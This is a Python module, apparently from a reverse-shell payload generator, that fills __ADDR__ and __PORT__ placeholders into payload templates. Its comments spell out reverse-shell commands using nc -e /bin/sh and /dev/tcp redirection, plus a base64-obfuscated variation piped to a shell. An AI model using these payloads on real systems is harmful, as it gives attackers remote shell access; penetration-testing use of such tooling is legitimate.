"""Placeholder module - ensures that __ADDR__ and __PORT__ are replaced accordingly."""
from typing import Dict, List, Union, Any


class Placeholder(object):
    """Replaces the __ADDR__ and __PORT__ placeholders on an item."""

    # --------------------------------------------------------------------------
    # Public functions
    # --------------------------------------------------------------------------
    @staticmethod
    def parse(item: Dict[str, Any], addr: str, port: str) -> Dict[str, Any]:
        """Replaces the __ADDR__ and __PORT__ placeholders on an item."""
        # item = {
        #   name: payload-name
        #   desc: payload-desc
        #   filters: {}
        #   variables: []
        #   variations: []
        #   payload: nc -e /bin/sh {ADDR} {PORT}
        # }

        # payload: sh>&/dev/tcp/__ADDR__/__PORT__ 0>&1
        payload = Placeholder.__replace(item["payload"], addr, port)

        # variables:
        #   - name: shell
        #     filters:
        #       shell: {VAR:shell}
        #     values:
        #       - val1
        #       - val2
        variables = Placeholder.__replace_variables(item["variables"], addr, port)

        # variations:
        #   - name: shell
        #     filters:
        #       obfuscated: true
        #     payload: $(echo {PAYLOAD}|base64)|{VAR:shell}
        variations = Placeholder.__replace_variations(item["variations"], addr, port)

        # Resemble
        item["payload"] = payload
        item["variables"] = variables
        item["variations"] = variations
        return item

    # --------------------------------------------------------------------------
    # Private functions
    # --------------------------------------------------------------------------
    @staticmethod
    def __replace_variables(
        variables: List[Dict[str, Any]], addr: str, port: str
    ) -> List[Dict[str, Any]]:
        """Replaces the __ADDR__ and __PORT__ placeholders."""
        # variables:
        #   - name: shell
        #     filters:
        #       shell: {VAR:shell}
        #     values:
        #       - val1
        #       - val2
        for i in range(len(variables)):
            # Replace anything in name
            variables[i]["name"] = Placeholder.__replace(variables[i]["name"], addr, port)

            # Replace anything in filters values
            for fname, fvalue in variables[i]["filters"].items():
                variables[i]["filters"][fname] = Placeholder.__replace(fvalue, addr, port)

            # Replace anything in variable values
            for val in range(len(variables[i]["values"])):
                variables[i]["values"][val] = Placeholder.__replace(
                    variables[i]["values"][val], addr, port
                )
        return variables

    @staticmethod
    def __replace_variations(
        variations: List[Dict[str, Any]], addr: str, port: str
    ) -> List[Dict[str, Any]]:
        """Replaces the __ADDR__ and __PORT__ placeholders."""
        # variations:
        #   - name: shell
        #     filters:
        #       obfuscated: true
        #     payload: $(echo {PAYLOAD}|base64)|{VAR:shell}
        for i in range(len(variations)):
            # Replace anything in name
            variations[i]["name"] = Placeholder.__replace(variations[i]["name"], addr, port)

            # Replace anything in filters values
            for fname, fvalue in variations[i]["filters"].items():
                variations[i]["filters"][fname] = Placeholder.__replace(fvalue, addr, port)

            # Replace variation payload
            variations[i]["payload"] = Placeholder.__replace(variations[i]["payload"], addr, port)

        return variations

    @staticmethod
    def __replace(
        data: Union[str, bool, List[str]], addr: str, port: str
    ) -> Union[str, bool, List[str]]:
        """Replaces the __ADDR__ and __PORT__ placeholders on list or string."""
        if isinstance(data, str):
            data = data.replace("__ADDR__", addr)
            data = data.replace("__PORT__", port)
        if isinstance(data, list):
            for index in range(len(data)):
                data[index] = data[index].replace("__ADDR__", addr)
                data[index] = data[index].replace("__PORT__", port)
        return data
